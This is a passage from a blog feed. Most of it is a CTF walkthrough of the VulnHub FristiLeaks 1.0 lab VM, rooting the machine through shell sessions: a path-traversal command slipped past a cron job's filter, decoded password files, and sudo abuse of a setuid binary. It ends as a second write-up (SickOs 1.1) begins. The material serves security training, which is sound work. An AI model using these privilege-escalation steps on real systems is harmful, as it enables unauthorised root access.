</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 ypdomainname
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz     <span class="m">62</span> Nov <span class="m">17</span> 09:49 zcat
</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47520</span> Nov <span class="m">17</span> 09:47 zic
</span><span class='line'>sh-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, it is really mess. but we can notice that there is another <code>notes.txt</code> which should be more clues in it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
</span><span class='line'>cat notes.txt
</span><span class='line'>Yo EZ,
</span><span class='line'>
</span><span class='line'>I made it possible <span class="k">for</span> you to <span class="k">do</span> some automated checks,
</span><span class='line'>but I did only allow you access to /usr/bin/* system binaries. I did
</span><span class='line'>however copy a few extra often needed commands to my
</span><span class='line'>homedir: chmod, df, cat, <span class="nb">echo</span>, ps, grep, egrep so you can use those
</span><span class='line'>from /home/admin/
</span><span class='line'>
</span><span class='line'>Don<span class="err">&#39;</span>t forget to specify the full path <span class="k">for</span> each binary!
</span><span class='line'>
</span><span class='line'>Just put a file called <span class="s2">&quot;runthis&quot;</span> in /tmp/, each line one command. The
</span><span class='line'>output goes to the file <span class="s2">&quot;cronresult&quot;</span> in /tmp/. It should
</span><span class='line'>run every minute with my account privileges.
</span><span class='line'>
</span><span class='line'>- Jerry
</span><span class='line'>sh-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like I have to break out of jail from <code>runthis</code>. So I create the file <code>runthis</code> under <code>/tmp</code>, which only including one command <code>chmod 777 /home/admin</code> to change folder permission of <code>/home/admin</code>. However, after couple of seconds waiting, I got the error information: <code>command did not start with /home/admin or /usr/bin</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/run   
</span><span class='line'>cat /tmp/runthis
</span><span class='line'>chmod <span class="m">777</span> /home/admin
</span><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/cron   
</span><span class='line'>cat /tmp/cronresult
</span><span class='line'><span class="nb">command </span>did not start with /home/admin or /usr/bin
</span></code></pre></td></tr></table></div></figure>


<p>Ok ok&hellip; so the command have to start with <code>/home/admin</code> or <code>/usr/bin</code>, so I modified the <code>runthis</code> file to <code>/home/admin/../../bin/chmod -R 777 /home/admin</code>, and waiting seconds, the <code>/home/admin</code> has been set to full permission now!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /home
</span><span class='line'>ls -al /home
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x.  <span class="m">5</span> root      root       <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root      root       <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
</span><span class='line'>drwxrwxrwx.  <span class="m">2</span> admin     admin      <span class="m">4096</span> Nov <span class="m">19</span> 02:03 admin
</span><span class='line'>drwx---r-x.  <span class="m">5</span> eezeepz   eezeepz   <span class="m">12288</span> Nov <span class="m">18</span> 15:35 eezeepz
</span><span class='line'>drwx------   <span class="m">2</span> fristigod fristigod  <span class="m">4096</span> Nov <span class="m">19</span> 01:40 fristigod
</span></code></pre></td></tr></table></div></figure>


<p>Get into <code>/home/admin</code> and enumeration, found three suspect files: <code>cryptedpass.txt</code>, <code>cryptpass.py</code> and <code>whoisyourgodnow.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/admin
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 652
</span><span class='line'>drwxrwxrwx. <span class="m">2</span> admin     admin       <span class="m">4096</span> Nov <span class="m">19</span> 02:03 .
</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root        <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin         <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">45224</span> Nov <span class="m">18</span> 13:42 cat
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">48712</span> Nov <span class="m">18</span> 14:14 chmod
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">737</span> Nov <span class="m">18</span> 14:48 cronjob.py
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin         <span class="m">21</span> Nov <span class="m">18</span> 15:21 cryptedpass.txt
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">258</span> Nov <span class="m">18</span> 15:20 cryptpass.py
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">90544</span> Nov <span class="m">18</span> 13:49 df
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">24136</span> Nov <span class="m">18</span> 13:40 <span class="nb">echo</span>
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 egrep
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 grep
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">85304</span> Nov <span class="m">18</span> 13:41 ps
</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod     <span class="m">25</span> Nov <span class="m">19</span> 01:47 whoisyourgodnow.txt
</span></code></pre></td></tr></table></div></figure>


<p>The file <code>cryptedpass.txt</code> contain crypted string <code>mVGZ3O3omkJLmy2pcuTq</code> and the file <code>cryptpass.py</code> seems a crypto program which the process is</p>

<ul>
<li>base64 encoded</li>
<li>reverse the string</li>
<li>encode the reversed string via rot13</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat cryptedpass.txt
</span><span class='line'>mVGZ3O3omkJLmy2pcuTq
</span><span class='line'>bash-4.1<span class="nv">$ </span>cat cryptpass.py
</span><span class='line'>cat cryptpass.py
</span><span class='line'><span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
</span><span class='line'>import base64,codecs,sys
</span><span class='line'>
</span><span class='line'>def encodeString<span class="o">(</span>str<span class="o">)</span>:
</span><span class='line'>    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
</span><span class='line'>    <span class="k">return</span> codecs.encode<span class="o">(</span>base64string<span class="o">[</span>::-1<span class="o">]</span>, <span class="s1">&#39;rot13&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="nv">cryptoResult</span><span class="o">=</span>encodeString<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">])</span>
</span><span class='line'>print cryptoResult
</span></code></pre></td></tr></table></div></figure>


<p>By using python, I decoded the secret string and got the plain text is <code>thisisalsopw123</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; import base64
</span><span class='line'>&gt;&gt;&gt; <span class="nv">cryptedtxt</span><span class="o">=</span><span class="s1">&#39;mVGZ3O3omkJLmy2pcuTq&#39;</span>
</span><span class='line'>&gt;&gt;&gt; base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)[</span>::-1<span class="o">]))</span>
</span><span class='line'><span class="s1">&#39;thisisalsopw123&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The same method to crack the secret string in <code>whoisyourgodnow.txt</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; <span class="nv">cryptedtxt</span><span class="o">=</span><span class="s1">&#39;=RFn0AKnlMHMPIzpyuTI0ITG&#39;</span>
</span><span class='line'>&gt;&gt;&gt; base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)[</span>::-1<span class="o">]))</span>
</span><span class='line'><span class="s1">&#39;LetThereBeFristi!&#39;</span>
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>My best guess is that <font color="red"><code>LetThereBeFristi!</code></font> is the password of the user <font color="red"><code>fristigod</code></font> &hellip; and &hellip; Yes! I am <code>fristigod</code> now!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>su fristigod
</span><span class='line'>su fristigod
</span><span class='line'>Password: LetThereBeFristi!
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /home
</span><span class='line'><span class="nb">cd</span> /home
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls
</span><span class='line'>ls
</span><span class='line'>admin  eezeepz    fristigod
</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd </span>fristigod
</span><span class='line'><span class="nb">cd </span>fristigod
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 20
</span><span class='line'>drwx------  <span class="m">2</span> fristigod fristigod <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod   <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod  <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
</span><span class='line'>-rw-r--r--  <span class="m">1</span> fristigod fristigod  <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
</span><span class='line'>bash-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After enumeration, I found something interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!
</span><span class='line'>
</span><span class='line'>Matching Defaults entries <span class="k">for</span> fristigod on this host:
</span><span class='line'>    requiretty, !visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS</span>
</span><span class='line'><span class="s2">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1</span>
</span><span class='line'><span class="s2">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE</span>
</span><span class='line'><span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY</span>
</span><span class='line'><span class="s2">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL</span>
</span><span class='line'><span class="s2">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
</span><span class='line'>
</span><span class='line'>User fristigod may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
</span></code></pre></td></tr></table></div></figure>


<p>After checking the file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I know this binary is owned by <code>root</code> and the sticky bit has been set. It will allow people to run command as ROOT.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>ls -al /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">7529</span> Nov <span class="m">25</span> 05:53 /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>bash-4.1<span class="nv">$ </span>strings /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>strings /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>setuid
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>strcat
</span><span class='line'>stderr
</span><span class='line'>system
</span><span class='line'>getuid
</span><span class='line'>fwrite
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>fff.
</span><span class='line'>fffff.
</span><span class='line'>l<span class="nv">$ </span>L
</span><span class='line'>t<span class="k">$(</span>L
</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="k">)</span>
</span><span class='line'>Usage: ./program_name terminal_command ...
</span><span class='line'>bash-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>But when I run the binary file <code>/var/fristigod/.secret_admin_stuff/doCom</code>, I got wrong user error message :(`</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>/var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>/var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>Nice try, but wrong user <span class="p">;</span><span class="o">)</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After further enumeration&hellip; I finally got clues in <code>/var/fristigod/.bash_history</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat .bash_history
</span><span class='line'>cat .bash_history
</span><span class='line'>ls
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>ls -lah
</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
</span><span class='line'>ls
</span><span class='line'>./doCom
</span><span class='line'>./doCom <span class="nb">test</span>
</span><span class='line'>sudo ls
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="nb">cd</span> .secret_admin_stuff/
</span><span class='line'>ls
</span><span class='line'>./doCom
</span><span class='line'>sudo -u fristi ./doCom ls /
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>groups
</span><span class='line'>ls -lah
</span><span class='line'>usermod -G fristigod fristi
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
</span><span class='line'>less /var/log/secure e
</span><span class='line'>Fexit
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s go rooting now!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="s1">&#39;ls -al /root&#39;</span>
</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!
</span><span class='line'>
</span><span class='line'>total 48
</span><span class='line'>dr-xr-x---.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:09 .
</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root root <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
</span><span class='line'>-rw-------   <span class="m">1</span> root root <span class="m">1936</span> Nov <span class="m">25</span> 06:10 .bash_history
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">18</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_logout
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> May <span class="m">20</span>  <span class="m">2009</span> .bash_profile
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">176</span> Sep <span class="m">22</span>  <span class="m">2004</span> .bashrc
</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 05:53 .c
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">100</span> Sep <span class="m">22</span>  <span class="m">2004</span> .cshrc
</span><span class='line'>-rw-------.  <span class="m">1</span> root root <span class="m">1291</span> Nov <span class="m">17</span> 06:51 .mysql_history
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root  <span class="m">129</span> Dec  <span class="m">3</span>  <span class="m">2004</span> .tcshrc
</span><span class='line'>-rw-------.  <span class="m">1</span> root root  <span class="m">829</span> Nov <span class="m">17</span> 09:17 .viminfo
</span><span class='line'>-rw-------.  <span class="m">1</span> root root  <span class="m">246</span> Nov <span class="m">17</span> 12:19 fristileaks_secrets.txt
</span><span class='line'>bash-4.1<span class="nv">$ </span>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom <span class="s1">&#39;cat /root/fristileaks_secrets.txt&#39;</span>
</span><span class='line'>stileaks_secrets.txt<span class="s1">&#39;ristigod/.secret_admin_stuff/doCom &#39;</span>cat /root/fri
</span><span class='line'>Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>I wonder <span class="k">if</span> you beat it in the maximum <span class="m">4</span> hours it<span class="err">&#39;</span>s supposed to take!
</span><span class='line'>
</span><span class='line'>Shoutout to people of <span class="c">#fristileaks (twitter) and #vulnhub (FreeNode)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Flag: Y0u_kn0w_y0u_l0ve_fr1st1
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Done..</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SickOs 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/12/25/vulnhub-sickos-1-dot-1/"/>
    <updated>2015-12-25T14:22:17+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/12/25/vulnhub-sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-11,132/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Sick0s: 1.1 (<em>10.1.1.149/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Squid Proxy misconfiguration</li>
<li>Shellshock bug</li>
<li>Wolf CMS 0.8.2 admin weak password</li>
<li>Sensitivie information disclosure</li>
<li>Local priv escape by misconfigured sudo list</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Exploit misconfigured Squid proxy to discover more hidden ports [<font color="FF8000">msfconsole with exploit: auxiliary/scanner/http/squid_pivot_scanning</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Login Wolf CMS 0.8.2 backend admin page with weak login credential <code>admin / admin</code></li>
<li>Exploit shellcode or upload webshell through wolfcms admin to get a limited shell</li>
<li>Enumeration and exploit the misconfigured sudo list to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
